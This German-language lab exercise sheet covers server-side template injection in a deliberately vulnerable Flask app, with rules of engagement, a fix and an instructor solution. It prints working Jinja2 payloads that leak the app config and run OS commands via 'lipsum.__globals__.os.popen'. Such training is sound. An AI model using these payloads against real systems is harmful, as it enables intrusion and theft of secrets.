# Challenge: Server-Side Template Injection (SSTI → RCE)

Ziel dieser Übung: Zeigt, dass eine Seite den Server übernehmen lässt, wenn sie
eure Eingabe nicht als **Daten**, sondern als **Template-Code** behandelt. Aus
einem harmlosen „Visitenkarten-Generator" wird so Code-Ausführung.

**Aufbau:** Jede:r startet die App auf dem **eigenen** Rechner. Der/die
**Nachbar:in** greift genau diese Instanz an.

> ```powershell
> $env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5003
> ```
> (Standard `127.0.0.1` = nur lokal. `0.0.0.0` nur im Kurs-Netz während des Termins.)

---

## Spielregeln

- Nur die Instanz angreifen, zu der ihr eingeladen wurdet. Keine anderen Dienste.
- Nur fiktive Eingaben. Kein DoS, kein Löschen/Verändern von Systemdateien.
- Befehle harmlos halten (`whoami`, `id`, `hostname`) — **nichts** Zerstörerisches,
  keine Daten abfließen lassen.
- Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

---

## Szenario

Der „Visitenkarten-Generator" nimmt deinen **Namen** und baut daraus eine
Begrüßung. Probiere aus, was mit dem Namen passiert — wird er nur eingesetzt
oder auch **ausgewertet**?

## Aufgabe

Bringt die Seite dazu, auf dem Server **beliebigen Python-Code** auszuführen
(z. B. den Benutzernamen des Server-Prozesses über `whoami` anzeigen) — nur über
das Namensfeld.

## Hinweis

- Teste zuerst, ob **gerechnet** wird: Name = `{{7*7}}`. Erscheint **49**, wird
  deine Eingabe als **Template** ausgewertet → SSTI.
- Die Template-Engine ist **Jinja2** (Flask). Über eingebaute Objekte kommst du
  an Python-Module heran.
- Eskalation: `{{ config }}` zeigt die Flask-Konfiguration (inkl. Geheimnisse).
- Für Befehle führt ein Weg über ein Jinja-Global zu `os`:
  ```jinja
  {{ lipsum.__globals__.os.popen('whoami').read() }}
  ```

## Erfolgskriterium

- `{{7*7}}` liefert `49` (SSTI bewiesen).
- Ein Payload zeigt die Ausgabe eines **Betriebssystem-Befehls** (z. B. `whoami`)
  auf der Seite.

## Zählt **nicht** als Lösung

- Nur `{{7*7}}` → 49 (das ist der Nachweis, noch nicht die „Übernahme").
- Code über die Konsole/lokal ausführen statt über das Namensfeld.

---

## Verteidigung / Fix

- **Ursache:** Nutzereingabe wird zur Template-**Quelle** gemacht
  (`render_template_string("… " + name)`).
- **Fix:** Niemals Nutzereingaben in `render_template_string`/Template-Text
  stecken. Feste Templates verwenden und Werte **als Kontext-Variable** übergeben
  (`render_template_string("Hallo {{ name }}", name=name)`) — dann werden sie als
  Daten behandelt und escaped, nicht ausgeführt.

<details>
<summary>Lösungsweg (für Lehrende / nach der Übung)</summary>

```text
Name = {{7*7}}                                           -> 49
Name = {{ config }}                                      -> Flask-Config (SECRET_KEY, LAB_FLAG)
Name = {{ lipsum.__globals__.os.popen('whoami').read() }}  -> Befehlsausgabe
```
Der Scanner im Nachbarordner `attacking/` erkennt SSTI über `{{NxM}}`:
```powershell
python ..\attacking\attack_all.py --base http://127.0.0.1:5003
```
</details>
